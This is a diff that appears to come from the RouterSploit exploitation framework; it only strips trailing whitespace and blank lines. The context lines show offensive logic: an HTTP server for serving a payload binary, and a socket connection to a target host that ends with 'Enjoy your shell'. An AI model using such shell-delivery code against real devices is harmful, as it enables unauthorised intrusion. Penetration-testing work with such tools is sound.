@@ -6,8 +6,7 @@ import threading
 import time
 
 from printer import printer_queue
-
-from routersploit import validators 
+from routersploit import validators
 
 from routersploit.utils import (
     print_info,
@@ -136,7 +135,6 @@ class Communication(object):
         self.options = options
         self.binary_name = random_text(8)
 
-
     def http_server(self, lhost, lport):
         print_status("Setting up HTTP server")
         server = HttpServer((lhost, int(lport)), HttpRequestHandler)
@@ -169,7 +167,7 @@ class Communication(object):
             print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
             time.sleep(2)
 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.options['rhost'], self.options['rport']))
 
             print_success("Enjoy your shell")
@@ -210,7 +208,7 @@ class Communication(object):
             print_status("Connecting to {}:{}".format(self.options['rhost'], self.options['rport']))
             time.sleep(2)
 
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((self.options['rhost'], self.options['rport']))
 
             print_success("Enjoy your shell")
